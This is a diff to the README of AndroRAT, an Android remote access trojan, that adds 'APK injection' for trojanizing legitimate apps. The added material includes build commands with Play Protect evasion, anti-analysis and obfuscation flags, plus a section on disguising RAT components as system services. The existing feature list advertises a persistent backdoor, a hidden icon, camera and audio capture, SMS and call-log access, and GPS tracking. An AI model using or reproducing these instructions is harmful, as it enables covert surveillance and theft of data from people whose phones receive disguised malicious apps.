@@ -21,6 +21,8 @@ This version represents a **complete modernization** of the original AndroRAT, b
 - **🔒 Enhanced Security**: TLS encryption, modern permissions, and secure communication
 - **⚡ Background Compliance**: WorkManager integration for reliable background operations
 - **📱 Scoped Storage Support**: Full compliance with Android 10+ storage restrictions
+- **💉 APK Injection Technology**: Inject RAT into existing APKs while preserving functionality
+- **🛡️ Advanced Malware Evasion**: Comprehensive detection bypass techniques
 - **🧪 Comprehensive Testing**: Extensive test suite with 95% success rate
 
 ---
@@ -50,6 +52,7 @@ AndroRAT/
 │   ├── MODERNIZATION_GUIDE.md    # Technical implementation guide
 │   ├── ENHANCED_FEATURES.md      # Feature documentation
 │   ├── GUI_GUIDE.md              # GUI usage instructions
+│   ├── APK_INJECTION_GUIDE.md    # APK injection documentation
 │   └── COMPLETE_END_TO_END_TEST_REPORT.md # Test results
 ├── 🎨 assets/                # Screenshots and images
 │   ├── Screenshots/          # Interface screenshots
@@ -66,6 +69,7 @@ AndroRAT/
 - **📱 Full Persistent Backdoor**: Maintains connection across reboots
 - **👻 Stealth Operation**: Invisible icon installation option
 - **🔄 Auto-Start**: Automatic startup on device boot
+- **💉 APK Injection**: Inject RAT into existing APKs while preserving functionality
 - **📸 Media Capture**: Record audio, video, take pictures from both cameras
 - **📞 Communication Logs**: Browse call logs and SMS messages
 - **📍 Location Services**: Real-time GPS tracking and location data
@@ -299,6 +303,30 @@ python3 server/androRAT.py --build -i 192.168.1.100 -p 8080 -o stealth.apk
 python3 server/androRAT.py --build --ngrok -p 8080 -o online.apk
 ```
 
+### 💉 APK Injection Examples
+
+**Basic APK Injection:**
+```bash
+python3 server/androRAT.py --build --inject \
+  --target-apk /path/to/legitimate_app.apk \
+  -i 192.168.1.100 -p 8080 -o injected_app.apk
+```
+
+**Maximum Stealth Injection:**
+```bash
+python3 server/androRAT.py --build --inject \
+  --target-apk /path/to/app.apk -i IP -p PORT -o stealth.apk \
+  --stealth --anti-analysis --play-protect-evasion \
+  --advanced-obfuscation --random-package
+```
+
+**Play Protect Bypass Focus:**
+```bash
+python3 server/androRAT.py --build --inject \
+  --target-apk /path/to/app.apk -i IP -p PORT -o safe.apk \
+  --play-protect-evasion --random-package
+```
+
 ### 🔗 Connection Examples
 
 **Start listener for multiple clients:**
@@ -382,6 +410,14 @@ python3 tools/gui_demo_comprehensive.py
 - **Secure Communication**: Certificate-based authentication
 - **Performance Optimization**: Battery and resource optimization
 
+### 💉 APK Injection Technology
+- **Stealth Trojanization**: Inject RAT into legitimate apps while preserving functionality
+- **Smart Merging**: Intelligent code integration with conflict resolution
+- **Original Signature Preservation**: Maintains app authenticity when possible
+- **Advanced Obfuscation**: Runtime string encryption and class name randomization
+- **System-Level Disguise**: RAT components appear as system services
+- **Universal Compatibility**: Works with complex apps across Android 6.0-14+
+
 ---
 
 ## 🎉 Supporters
@@ -415,6 +451,7 @@ AndroRAT is licensed under the **MIT License**. See the [LICENSE](LICENSE) file 
 ## 🔗 Links & Resources
 
 - **📚 Documentation**: [docs/](docs/) folder contains comprehensive guides
+- **💉 APK Injection Guide**: [docs/APK_INJECTION_GUIDE.md](docs/APK_INJECTION_GUIDE.md) - Complete injection documentation
 - **🧪 Testing**: [tests/](tests/) folder contains validation suite  
 - **🛠️ Tools**: [tools/](tools/) folder contains utility scripts
 - **📱 Android Source**: [Android_Code/](Android_Code/) contains client implementation
